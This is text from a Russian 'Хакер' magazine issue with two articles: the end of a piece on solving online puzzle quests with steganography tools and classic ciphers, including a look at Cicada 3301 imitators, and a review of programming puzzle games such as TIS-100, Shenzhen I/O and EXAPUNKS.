заметны уже знакомые символы USI.





                             They Will Know





Мне было любопытно, пос кольку я с таким столкнулся впервые. Поэтому я
перебирал все возможные варианты подхода к решению. Но чем больше ути‐
лит было использовано, тем понятнее становилось, что это ни к чему не при‐
ведет. Все очевидные и прос тые пути решения не помогли.
   Здесь мы плавно перехо дим к утилитам для поиска скрытых данных в изоб‐
ражениях. Например, есть Stegsolve — она прос та и легка в использовании,
поэтому подойдет для начального анализа. Эта же утилита помогает находить
отличающиеся пиксели в двух изображениях. Увы, в нашем случае ничего
явно она не показала.
  Еще я воспользовался Steghide. Она помогает как зашифровать любой
текст внутри изображения, так и понять, есть ли внут ри графических фай лов
что‐нибудь интересное. Для дешифровки нужна фраза‐пароль, и тут вари‐
антов не очень много. У нас есть стро ки 1999 и USI, остается попробовать
разные их сочетания.





              Скрытые в изоб ражениях тексто вые файлы

Ура! Вариант 1999USI подошел, извлекаем из каж дой картинки по текстовому
файлу. Каждый зашифрован другим алгоритмом.





Не буду останавливаться на том, как я определял шифры, скажу лишь, что
слева текст закодирован при помощи AER‐256. По центру, как несложно
догадаться из перевернутого два раза слова Polybius, шифр Полибия (он же
квадрат Полибия). А спра ва — Base36.
   Зная алгоритмы, нетрудно рас шифровать и текст. Для AER‐256 исполь‐
зуем ресурс с огромным выбором алгоритмов. Квадрат Полибия — одна
из самых древних систем кодирования. Здесь исполь зуется прос тая замена,
и никаких сложностей тут не воз никло — достаточно указать Polybius‐square
decrypt. Base36 декодируем уже с помощью зна комо го нам ресурса dCode.





                                Congratulations!

Теперь мы можем соб рать воедино три обрывка адреса сай та в .onion.
Переходим по нему и оказываемся на странице с еще одной картинкой
и странным текстом.





                                 USI

Стеганография, похоже, бессиль на перед треть им изображением. На Reddit,
к слову, есть обсуждение, где изоб ражения с символами USI были выложены
в пост с двадцатью другими, которые, на мой взгляд, к делу никак не относят‐
ся. Все они были найдены перебо ром списка хидденсервисов на бесплатном
даркнет‐хостинге  Daniel’s  Hosting. Соответственно, никакой информации
об их связи или тем более порядке следования у нас нет.


             INFO

                           Daniel’s  Hosting был  круп нейшим бесплатным
                        хостинг‐сервисом  в  даркнете.  Почему  был?
                     25 марта 2020 года проект окон чательно зак‐
                        рылся.


Это дает отве ты на возможные вопросы о несовпадении ссы лок на моем
канале про нетсталкинг «Горизонт Событий» и в статье, а также на вопрос,
почему недоступна та или иная ссылка. Я был вынужден поднять скинутые
Даниэлем архивы на другом хостинг‐сервисе, чтобы к ним был хоть какой‐то
доступ после закрытия хос тинга. К сожалению, из‐за нестабильности работы
хостинг‐сервисов в Tor ресурсы дос тупны не всегда.
   Кажется, что на этом все и заканчивается, так и не поведав нам о сакраль‐
ном смысле 1999USI. Но в этот же день случайным образом мне попался
на глаза еще один FTP‐сервер с шестью аудиозаписями.





                   Без Audacity здесь не обойтись

Спектрограмма всех WAV‐файлов показывает очень интересные вещи.





                                1999.07.04





                               BioHazard

Не буду приводить все изображения, подробности можешь пос мотреть
в моем канале.
   Вот и цифры 1999 всплыли! Но что произошло 4 июля 1999 года? Что
вообще это значит? У меня, к сожалению, нет мнения на этот счет. Вот, нап‐
ример, на сайте министерства иностранных дел Индии есть занимательный
текст, в котором упомянута эта дата.
  К сожалению, квест не пройден и скорее всего утерян вместе с Daniel’s
Hosting. Кроме поста на Reddit, он не упоминается нигде в клирнете.
  И это тоже показательно: не все загадки, которые ты найдешь в интернете,
получится разгадать.


ПОДДЕЛКИ ПОД «ЦИКАДУ»
Ты наверняка слышал про Cicada 3301 — зна мени тый и широкомасштаб ный
хакерский квест, организа торы которого так и оста лись неизвес тными (если
не слышал — смотри врезку ниже). Популярность и загадочность «Цикады»
сделала ее привлекатель ной мишенью для имитации.


Cicada 3301
Белые буквы на черном фоне гласили: «Мы ищем очень умных людей. Чтобы
найти их, мы разработали тест. В этой картинке спря тано сообщение. Най ди
его, и оно укажет дорогу, ведущую к нам. Мы будем рады встре тить тех нем‐
ногих, что дойдут до конца. Уда чи!» В конце стоит подпись: 3301.





                   Первое пос лание «Цикады»

Оригинал этого сооб щения появился в янва ре 2012 года на анонимном
форуме 4chan и сумел привлечь к себе большое внимание. Как и задумывали
его неведомые авторы, по следу немедля пустились те самые умные люди.
Кто‐то из них дошел до цели и, предположи тельно, присоединился к группе,
именуемой Cicada 3301. Но что это за группа и чем она занимается, пока что
остается тайной. Все, что мы знаем, — это рас ска зы тех, кто сбился с пути
и не прошел задание до конца.
  Подробности этой исто рии ты можешь найти в статье «Загадка Цикады»,
опубликованной в 184‐м номере «Хакера» за май 2014 года. С тех пор
«Цикада» себя не проявляла... по крайней мере, нас только заметно.


21 марта неизвестный юзер прислал в телеграм‐чат secinfosec нес колько
сообщений, написанных азбукой Морзе, и изоб ражение с QR‐кодами.





                    Сообщения от юзера

Вскоре сообщения были уда лены, но это не помеша ло их изучить (спасибо
привычке пересылать в избранное). По сво ей сути код Морзе здесь — рас‐
шифрованные QR‐коды с приложенного изображения, это можно понять,
отсканировав их любым ска нером. Рас шифруем морзянку с помощью пе‐
реводчика в обычный текст и получим невнятную строку.


APKWJJWTZQJYJMYYUX://AFUU.HTR.000BJGMTXY





                    Рас шифрованное сооб щение

По символам двоеточия и обратного слеша  становится  понятно,  что
это ссылка. Поэто му строку необходимо расшифровать еще раз, но при‐
меняя уже шифр Цезаря. На выходе получаем дру гую строчку.


VKFREEROULETEHTTPS://VAPP.COM.000WEBHOST

Возможно, дальше что‐то и мож но сделать, но зачем? Реклама, скры тая
в двух шифрах, не представляет никако го интереса для исследователя,
а использовать чужое любопытство в корыстных целях некрасиво. Хотя
не исключено, что это чья‐то сфабрикованная от большого безделья шутка.
Этот пример показывает, нас колько все‐таки тематика ARG при жилась
в обществе. Не ловись на очередную «цикаду»!


ВЫВОДЫ
Вот мы и познакомились с парой‐тройкой квестов‐паз лов и приемами,
которые помогают их проходить. Cicada 3301 начала эту интересную моду,
и встретить нерешенные задачки сейчас вполне реально. Кстати, и создавать
свои квесты тоже не менее увлекательно, чем проходить их!


             INFO

                     Решившись делать что‐то свое, подумай над кон‐
                        цовкой. Прежде всего ответь на воп рос «Что я
                       могу дать сообществу?». Так ты сэконо мишь вре‐
                    мя людей, которые им дорожат.


И создатель, и игрок в ито ге отта чивают свои скиллы в криптографии, сте‐
ганографии и в других, иногда самых неожиданных областях. И это уже
не говоря о том, что по увлекательности с такими играми редко что срав‐
нится. Лично для меня было совершенно бесценно увидеть на спектрог‐
рамме случайного звукового файла значок биоло гической угрозы.
   Что  до  полезных  утилит,  то  владение  ими,  бесспорно,  помогает
при решении, но иногда они абсолютно бесполезны. Так, я какое‐то время
сканировал на скрытые директории чуть ли не каждый попавшийся ресурс
в даркнете. При решении ARG или квестов в стиле ARG гораз до ценнее эру‐
дированность и нешаблонное мышление.


        WWW

                   В кон це я хотел бы поделиться всякими любопыт‐
                    ными вещами, которые по той или иной причине
                      не вошли в статью.
                       •Статья о решении первой части недоступного
                        сейчас квеста WhiteRose (очередная отсылка
                            к Mr. Robot)
                      •Пост в канале о головоломке Tyche5765
                   •Еще один пост с головоломкой
                      •Пост c известной на Reddit загадкой GRTSK
                    •Один из крупнейших англоязычных ресурсов
                        о событиях в мире ARG
                      •Чат с решениями и обсуждением
                     •Канал, в котором я публикую найденные в Tor
                          квесты
GEEK
 ИГРЫ
     В КОМПЬЮТЕР





    ОБЗОР ИГР, КОТОРЫЕ НЕ ТОЛЬКО
    РАЗВЛЕКУТ, НО И ОБУЧАТ ВАЖНЫМ
            НАВЫКАМ





Если ты читаешь эти стро ки, у нас для тебя
хорошие новости: ты пока еще не умер
от сам‐знаешь‐какого вируса! Из плохих
новостей — тебя, скорее всего, уже поп‐
росили самоизолироваться и соблюдать               faberge                                                                             Цифровыхъ дѣлъ мастеръ
карантин,  работая  из  дома.  Сидеть       fabulous.faberge@yandex.ru
в четырех стенах невыносимо уныло, поэто‐
му, чтобы не страдать от скуки, самое вре‐
мя размять мозги интересными задачками.
Тем более что тут у нас отличный список!


Прежде чем перейти непос редственно к обзорам, должен предупредить тебя
о паре вещей. Здесь точно не будет «топовых», мас штаб ных игр с огромными
бюджетами. И вовсе не потому, что мы тут в «Хакере» их по каким‐то при‐
чинам не любим. Просто, как правило, такие игры пред назначены для мас‐
совой аудитории. А ожидать от среднестатистичес кого геймера продвинутых
знаний в области информатики и компьютер ных технологий все‐таки не при‐
ходится.
  Поэтому игровые механики таких популярных игр соз нательно упрощают‐
ся, чтобы потенциальный потребитель, столкнувшись с непонятными для него
вещами, лишний раз не впадал во фрус тра цию и не расстраивался. В худшем
случае такой подход вырождается в при митивное Press X to hack. Рис куя нав‐
лечь на себя гнев скрипт‐кидди (для которых подобное положение вещей
представ ляется впол не естес твенным), мы все же исключили такие проекты
из нашей подборки.
  Однако это не значит, что далее тебя ждут исклю чительно «хардкорные»
игры. Мы постарались соб рать сбалансированный список, который был бы
интересен программистам и хакерам с раз ным уровнем подготовки. Клю‐
чевой момент — хоть какие‐то базовые зна ния потребуются в любом случае.
«Первому игроку приготовиться!»


MHRD
 • Раз работчик: Funghisoft
 • Дата выхода: январь 2017 года
 • Язы ки: только английский
 • Це на: 250 рублей (Steam)
 • Где купить: Steam, itch.io

Об этой игре нам уже напоминали читатели в комментариях  к статье
про основы цифровой схемотехники. Действительно, оформленная в рет‐
ростилистике, MHRD предлагает игроку примерить на себя роль инженера —
разработчика цифровой логики и даже собрать полноценный 16‐битный про‐
цессор (в качестве такого своеобразного «финаль ного босса»). Вне всяких
сомнений, создатели игры вдохновлялись историей компаний — пионеров
Кремниевой долины (тут даже есть нес колько не самых очевидных, но забав‐
ных шуточек о семидесятых).





MHRD сознательно выводит за скобки структуру и принцип действия тран‐
зистора — ключевого элемен та любой сегодняшней цифровой схе мы. Если
физика процесса, равно как и перемещение дырок и электронов в полуп‐
роводниках тебя мало интересуют, смело можешь ставить плюсик игре.
Вместо этого MHRD концентрируется на уровне конкретных элементов —
вентилей И, ИЛИ, НЕ и про чих.
  Придерживаясь логики изло жения многих учеб ников, игра последователь‐
но проводит тебя от базовых операций к блокам мультиплексора и триггера,
а от них — к дешифратору команд, регистрам и АЛУ, ключевым элементам
процессора. При этом MHRD лучше обычных учеб ников благодаря инте рак‐
тивности: каждую схему предстоит не только синтезировать из уже готовых
блоков с помощью внутриигрового HDL  (Hardware Description Language),
но еще и дополнительно верифицировать — успешно прогнать через набор
тестов.





Игра обладает минималис тичным интерфейсом и практичес ки полностью
текстовая. Рассчитывать на графичес кое представление цифровых вентилей
на экране тут не приходится. Вместо этого для боль шего погружения в про‐
цесс и эпоху игроку предлага ется использовать бумагу и карандаш и чертить
схемы по эту сторону монито ра. И поверь, на деле это гораз до увлекатель‐
нее, чем звучит на словах (рекомендуем бумагу‐миллиметровку и карандаш
с мягким стержнем для наилучшего результата).
  Прохождение MHRD отлично сочетается с чтением какой‐нибудь литера‐
туры о цифровых схемах. Можешь, кстати, начать с цикла статей в нашем жур‐
нале! В самой игре подска зок и пояс нений немного, встроенной справки
тоже нет, поэтому пол ностью пройти игру без посторонней помощи сможет
разве что разработчик на ПЛИС или тот, у кого соответствующий курс был
недавно в учебной программе.
  Реиграбельность и дополнительный интерес обеспечивает внутренний
рейтинг, который учитывает «стоимость» каждой схемы в логических эле мен‐
тах. Порой оптимизация решения представляет собой куда более сложную
задачу, так что поломать голову тут есть над чем. Особое удовольствие —
найти минимальную схему для финального вари анта процес сора. Не будем
портить сюрприз, но там точно есть чему удивиться!





Если говорить о минусах игры, то их немного и существенными их назвать
сложно. Да, тут нет никакого зву кового сопровождения, за исключением мер‐
ного гула вентиляторов и клацанья механической клавиату ры (но музыку ты
всегда можешь подоб рать свою). Сюжета и персонажей в MHRD тоже прак‐
тически нет, хотя для головоломки это, наверное, и не критично.
  На мой взгляд, основной недос таток игры в том, что почти все схемы тут
стандартные, классичес кие. А ведь на цифровой логике можно собирать
не только компоненты центрального процес сора, но и куда более специфич‐
ные периферийные устройства. Было бы здорово увидеть в игре задания и с
ними. Кроме того, в MHRD не хватает режима песочницы, где игрок мог бы
экспериментировать с собственными схемами.
  В нашем списке игр нет ито говых баллов и традиционного рас пределения
по местам. Результат формулируется проще: можно эту игру рекомендовать
или нет. И MHRD однозначно рекомендовать можно!


SILICON ZEROES
 • Раз работчик: PleasingFungus Games
 • Дата выхода: сентябрь 2017 года
 • Це на: 350 рублей (Steam)
 • Где купить: Steam, itch.io
 • Язы ки: только английский

На первый взгляд, у Silicon Zeroes и MHRD много общего. Действи тельно,
снова игра‐головоломка по мотивам цифровой схемотехники, снова стартап
из Кремниевой долины и снова цель собрать центральный процес сор. Одна‐
ко при более близком ознакомлении оказыва ется, что сходства между двумя
играми на этом заканчиваются и дальше идут сплошные раз личия. Рассмот‐
рим их подробнее.





Во‐первых, Silicon Zeroes — игра с симпатичным графическим интерфейсом.
И цифровые блоки, и соединитель ные сигналы между ними тут имеют вполне
наглядное визуальное представление. Рабочая область в каждом задании
ограничена, но внутри нее игрок может самовы ражать ся свободно, и это при‐
ятно. Если суровые, аскетичные скриншоты MHRD тебя отпугнули, то этот
момент точно порадует.
  При этом сам интерфейс слегка разочаровывает. Создается впе чатление,
что его проектировали под мобильные плат формы и сенсорное управление,
на экране компьюте ра элемен ты выг лядят несураз но большими и расположе‐
ны слишком далеко друг от друга. И да, тут дос тупен режим песочницы.





Во‐вторых, в  Silicon Zeroes неожиданно есть персонажи, сюжет и даже
некоторая производственная драма! Вместо того чтобы маячить едва уло‐
вимыми призраками где‐то на периферии сознания, как в MHRD, здесь кол‐
леги не только охотно делятся с тобой полезными сведениями, но и обсужда‐
ют происходящие внутриигровые события. Не то чтобы это было очень уж
интересно, но всяко лучше, чем ничего.
  Наконец, в‐третьих, — и это клю чевое отличие — авторы Silicon Zeroes
решили отойти от традиционно го представления цифровых блоков на основе
булевой логики. Это дос таточно важный нюанс, на котором стоит остановить‐
ся подробнее. Здесь входы, выходы и сигнальные линии на схемах опе рируют
не двоичными значениями (нулем и единицей), а числами вообще. Более
того, ближе  к середине игры вводится дополнительный  внутриигровой
«тип» — команда (код операции), который почему‐то числом не является (но
мы‐то знаем, что это тоже число).
  Причины такого решения понять, вооб ще говоря, трудно. Можно пред‐
положить, что создатели хотели избежать двоичного представления чисел
и таким образом расширить целевую аудиторию за счет тех, кто умеет только
в десятичное представление. На деле такое «упрощение» оказывает мед‐
вежью услугу — схемы в игре очень быстро перестают быть даже отдаленно
похожими на «классичес кие». Какую пользу может вынести для себя игрок
в Silicon Zeroes — вопрос оста ется открытым.





Таким образом, как головоломка игра вполне имеет право на жизнь. Тем
более что в определенный момент в схемах появляется допол нительный эле‐
мент сложности — задержка рас простра нения сигнала. Его не было, нап‐
ример, в MHRD, и, наверное, подобную игровую механику стоило бы всячес‐
ки приветствовать, но… Итоговый результат к реальному железу не имеет
никакого отношения.
  Рекомендовать Silicon Zeroes в качес тве пособия по схе мотехнике сложно.
Вместо того чтобы расска зать об этом «как есть» или придумать оригиналь‐
ную концепцию  (как далее в  TIS‐100), авторы выбрали промежу точное
решение и ввели допол нитель ный слой абстракций. Зачем — непонятно.


TIS-100
 • Раз работчик: Zachtronics
 • Дата выхода: июль 2015 года
 • Язы ки: английский, но руководс тво на рус ском
 • Це на: 170 рублей (Steam)
 • Где купить: Steam, GoG, itch.io, iOS

TIS‐100 — игра уникальная во всех аспектах. Чтобы это понять, в нее даже
необязательно играть, дос таточно почитать отзывы, в которых профес‐
сиональные программисты делятся своими вос торженными впе чатлениями
от самого процесса программирова ния. Это примерно будто дальнобойщик
с двадцатилетним водительским ста жем взахлеб всем рассказывает, как про‐
шел его очередной рейс. Когда повторяешь что‐то изо дня в день, даже инте‐
ресные вещи быстро превращаются в рутину.
   TIS‐100 очень самобытна. Если попытаться словами описать игровой про‐
цесс, то наиболее близким будет: «это программи рование распределенной
парал лельной системы на ассемблере». Но это как‐то слишком длинно
и малопонятно. Так что мож но ска зать просто: «Это потрясающе!» Да, так
гораздо понятнее и лучше!





TIS‐100 — игра‐загадка, она и начина ется‐то с таинс твенного послания
на полях документации к компьютеру непонятной архитектуры. Ключ ко всему
содержится где‐то там, в поврежденных ячейках памяти. Вот только добыть
его неимоверно трудно. И это совсем не художес твенное преувеличение.
   TIS‐100 очень быстро учит игрока, что его приобре тенные навыки прог‐
раммирования и сфор мированные парадигмы мышления здесь мало чего
стоят. Лишними‐то они, конечно, не  будут, но многое придется пере‐
осмыслить. Ну действительно, как вооб ще мож но что‐то сделать, когда у тебя
в распоряжении один регистр (окей, полтора — еще один без прямого дос‐
тупа)? Оказывается, можно, и еще как.





TIS‐100 вводит концепцию «нод‐ориентированного программирования», где
каждая отдельная нода представляет собой процессор с крайне ограничен‐
ными ресурсами. Память на пятнадцать ассемблерных команд — и ни в чем
себе не отказывай. Хотя можно объединять ноды и перемещать значения
между ними — но нужно строго соб людать последовательность чтения
и записи в порты обмена.
   TIS‐100, впрочем, идет дальше. Немного освоившись и решив первые
несколько заданий, ты начинаешь уже видеть, как новая программа разбива‐
ется на ноды (а не функции или объекты!) и обрабатывает входной поток дан‐
ных, резво перебрасывая про межу точные зна чения в портах обмена. Сов‐
местная работа нод гораздо быстрее и эффективнее. А что, если организо‐
вать параллельный поток и добавить еще нод?
   TIS‐100 в этот момент открывается с новой стороны. Поиск решения тут
сам по себе увлекателен и способен рас тянуть ся на дол гое время. Но про‐
цесс оптимизации решения – о, это интеллектуальное удовольствие сложно
с чем‐то сравнить. Оптимизировать можно сра зу по нескольким парамет‐
рам — числу занимаемых нод, количеству инструкций и скорос ти выполнения
программы. И каждое решение будет по‐своему уникальным. Эта игра в сос‐
тоянии быть сложной нас только, насколько ты захочешь.





TIS‐100 — не самая дру желюбная к новичкам игра. С нее точно не стоит
начинать знакомство с программированием. У нее достаточно примитивный
интерфейс и нет музыкального сопровождения. Временами она может
бесить. И способна сожрать кучу твоего времени. Но если по каким‐то при‐
чинам ты выбираешь толь ко одну игру из всего спис ка — бери TIS‐100.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
 ИГРЫ В КОМПЬЮТЕР
        ОБЗОР ИГР, КОТОРЫЕ НЕ ТОЛЬКО РАЗВЛЕКУТ,
                НО И ОБУЧАТ ВАЖНЫМ НАВЫКАМ





SHENZHEN I/O
 • Раз работчик: Zachtronics
 • Дата выхода: ноябрь 2016 года
 • Язы ки: английский и китайский
 • Це на: 350 рублей (Steam)
 • Где купить: Steam, GoG, itch.io

Первая в нашем списке игра о разработчиках не из Кремниевой долины
и первая игра, действие которой разворачивается не в прошлом (и даже не в
будущем), а в настоящем. Игро ку предлага ется примерить на себя роль
инженера молодой китайской компании и принять участие в создании сов‐
ременных цифровых устройств.
   Shenzhen I/O берет на себя неп ростую задачу и старается продемонстри‐
ровать игроку процесс раз работки электроники практичес ки на всех этапах.
Все начинается с изучения вну шитель ной подборки даташитов и мануалов
«вымышленных» произво дителей микросхем, но при желании аналогии легко
угадываются. Авторы игры кропотливо перенес ли все детали подобных
руководств, сохранив логику и структуру основных разделов. Порой докумен‐
тация выглядит просто пугающе реалис тичной.





Далее идет выбор комплектующих. Как и в других головоломках подобного
рода, тут предлагается не только найти решение, но еще и дополнительно
оптимизировать его: по цене, энергопотреблению и прочим параметрам.
Каждый  компонент  имеет  вполне  определенную  стоимость  в  юанях,
и руководство компании в деловой переписке никогда не упустит слу чая
напомнить тебе, что устройство обязано быть дешевым, чтобы оказаться
массовым. Очень, очень реалис тично!
  Наконец, можно раз водить плату для устройства и программи ровать
логику работы мик роконтроллеров. И здесь Shenzhen I/O сильно выигрывает
за счет своего комплексного подхода к моделирова нию процесса раз работ‐
ки. Грамотно сочетая в себе и схемотехнику, и прог раммирование, игра наг‐
лядно показывает, как одну и ту же задачу можно решить разными способа‐
ми: либо аппаратно, либо программно. Такой «фазовый переход» на границе
кода и железа.
   Shenzhen I/O покоряет своим раз нооб разием. Десятки компонентов, мик‐
роконтроллеры  и  микросхемы  комбинаци онной  логики, перифе рийные
устройства — авторы смогли внутри игры воссоздать современную элемен‐
тную базу, которая, с одной стороны, достаточно похожа на реальную, но при
этом все же име ет занятные нюансы, чтобы развлечь и специалистов тоже.





Если ты уже успел сыграть в TIS‐100 или MHRD и по каким‐то причинам они
показались тебе слишком однообразными, то Shenzhen I/O тебя приятно уди‐
вит. Однако если в TIS‐100 для старта достаточно было прочитать лишь один
мануал по ассемблеру и архитектуре, то здесь к документации придется
обращаться постоян но. Аскетичность и минима лизм — это точно не про
Shenzhen I/O.
  Впрочем, ей это и не нужно. Больше, лучше, быс трее — игра наполнена
энергией и динамикой современной эпохи, бешено пульсирующим ритмом
огромного мегаполиса и ежедневными интеллектуальными вызовами. Игра
Shenzhen I/O однозначно зас луживает наших рекомендаций.


HUMAN RESOURCE MACHINE
 • Раз работчик: Tomorrow Corporation
 • Дата выхода: октябрь 2015 года
 • Язы ки: английский, русский и дру гие
 • Це на: 360 рублей (Steam)
 • Где купить: Steam, GoG, itch.io, iOS, Android

Первое, чем запоминается эта игра, — весьма необычный для головоломок
сеттинг и антураж. Оформленная в мультяшном стиле, но темных тонах анти‐
утопии, игра в равной степени производит несерь езное впечатление повер‐
хностной сатиры и одновременно талантливого оммажа на оруэлловский
«1984». Вдобавок где‐то на подсту пах к городу здесь маячит армия машин,
о которой обеспоко енно сообщает диктор на телевидении. Раз работчик явно
не стремился ограничить свою фантазию!





Для человека, хорошо зна комо го с низкоуровневым программированием,
HRM не станет откровением. Большинство игровых задач тут достаточно лег‐
ко переформулировать в терминах языков ассемблера или С — а дальше
остается только пор тировать решение, что вряд ли займет много времени.
Игру вполне можно завершить  за нес коль ко  часов, если не  ставить
перед собой цель выполнить все задания на опти мизацию.
  Прохождение осложняется еще и неудоб ным интерфейсом игры. Даже
максимальная скорость выполнения программы здесь оказывается черес чур
медленной для некото рых финальных этапов, с наиболее заковы ристыми
реализациями. Кроме того, тут нельзя по‐человечески редактировать код
с клавиатуры — игроку требуется вся кий раз перетя гивать мышью команды
и расставлять их в нужной последова тельности.





HRM здорово бы выиграла от банальной возможности структурировать код,
вынося отдельные куски в функции, — тогда ее можно было бы рекомен‐
довать как минимум в обра зовательных целях. Вмес то этого игроку предлага‐
ется писать «спагетти»‐код, с высоким содержанием безусловных переходов
в самые разные части программы. Если беспорядочные хитрос плетения
прыжков тут и могут чему‐то научить игрока, то толь ко тому, что так делать
точно не стоит.





Из плюсов игры стоит отметить музыкальное соп ровождение и хороший
юмор разработчиков. Почти каждый брифинг перед заданием сопровождает‐
ся неприкрытым стебом авто ра над корпоративными ценностями крупных
компаний, государственным контролем, современным обществом потребле‐
ния и разными неоднозначными аспектами прог раммирования.


EXAPUNKS
 • Раз работчик: Zachtronics
 • Дата выхода: октябрь 2018 года
 • Язы ки: английский, но руководс тво на рус ском
 • Це на: 435 рублей (Steam)
 • Где купить: Steam, GoG, itch.io

После знакомства с EXAPUNKS нам сложно представить себе более «хакер‐
скую» игру. Безумный сплав киберпанка и ретрофуту ризма, круто замешан‐
ный на низкоуровневом программировании и получении контроля над чужими
компьютерами, безошибочно отзовется в сознании любого, кто нерав‐
нодушен не только к информационным технологиям, но и к таким произве‐
дениям, как «Нейромант», «Мат рица» или Deus Ex.





Для этого у EXAPUNKS подготовлен полный набор обязательных элементов,
бережно расставленных в нуж ных местах сюжета для создания той самой
киберпанковской атмосферы. Антиутопия, принцип high tech — low life? Есть.
Шифропанки, отвергнутые общес твом и ютящиеся в тру щобах, зараженные
загадочной болезнью? Есть. Искусс твенный интеллект, чьи истинные мотивы
никому не известны? Есть. Черт побери, тут даже азам внутриигрового
ассемблера и тонкостям взлома игрока обучают в формате выпусков под‐
польного журнала! Мы в «Хакере» все дружно считаем это просто сверхре‐
алистичным моментом!
  Нащупав в TIS‐100 и Shenzhen I/O удачные механики «игры о низкоуров‐
невом программировании», в Zachtronics не стали слепо копировать свои же
идеи и придумали кон цепцию EXA — мини атюрных цифровых роботов,
которые манипулируют данными и вза имодейству ют с остальными компь‐
ютерными системами. Каждый EXA исполня ет собс твенную  программу
и впол не самодостаточен. Но, как и прежде, реальная глубина геймплея
открывается игроку при совместных дей стви ях нескольких EXA.





Как результат, работа прог раммы на игровом экра не стала наглядной. Здесь
это не просто перемещение абстрактных чисел из регис тров в порт
и обратно: EXA исполь зуют ссылки, путешес твуют между серверами, похища‐
ют и фальсифицируют данные в пользовательских файлах. При этом слож‐
ность заданий и достаточно кру тая кривая обучения остались прежними, так
что фанаты «хардкора» в играх Zachtronics могут спать спокойно. Равно как и
любители соревноваться решениями в рейтингах — разработчики убрали
ограничение на количество строк кода для каж дого EXA, но процесс опти‐
мизации по‐прежнему приносит огромное удоволь ствие.





Стоит ли играть в EXAPUNKS? Однозначно стоит. Единственное, если пла‐
нируешь так или иначе попробовать все игры Zachtronics подобного плана,
то, возможно, лучше все же проходить их в хро нологическом порядке выпус‐
ка. И вовсе не потому, что они объединены какой‐то общей все ленной
или сюжетом. Просто после EXAPUNKS в TIS‐100 и Shenzhen I/O хорошо вид‐
на некоторая бюджетность про ектов. Безусловно, авторы тогда не могли поз‐
волить себе реализовать все имеющиеся идеи на должном уровне. Но успех
первых игр и поддержка благодарных игроков сделали свое дело.